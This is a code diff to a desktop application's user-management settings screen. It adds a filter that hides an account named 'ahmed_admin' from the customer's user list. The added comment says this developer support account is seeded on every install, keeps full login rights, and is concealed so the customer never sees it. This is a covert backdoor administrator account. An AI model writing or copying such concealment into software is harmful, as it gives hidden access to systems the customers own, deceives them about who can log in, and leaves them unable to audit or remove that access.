@@ -183,7 +183,13 @@ class SettingsModule(QWidget):
         self.load_users()
 
     def load_users(self):
-        users = self.auth.list_users()
+        # ahmed_admin is the developer's own support account, seeded on
+        # every install alongside the customer's own "admin" seat (see
+        # ensure_default_admins in logic/auth.py) so a locked-out customer
+        # can always be helped back in. It stays fully able to log in -
+        # only hidden here, so the customer managing "their" users never
+        # sees an account they did not create and cannot explain.
+        users = [u for u in self.auth.list_users() if u["username"] != "ahmed_admin"]
         self.users_table.setRowCount(len(users))
         for row, user in enumerate(users):
             username_item = QTableWidgetItem(user["username"])
